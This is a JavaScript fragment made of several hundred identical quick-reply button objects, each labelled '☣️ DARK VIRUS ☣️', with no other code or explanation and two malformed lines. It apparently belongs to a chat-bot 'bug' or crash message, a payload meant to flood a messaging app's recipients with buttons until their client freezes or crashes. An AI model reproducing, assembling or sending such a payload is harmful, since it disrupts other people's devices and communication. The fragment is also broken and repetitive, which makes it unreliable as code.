{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
 quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
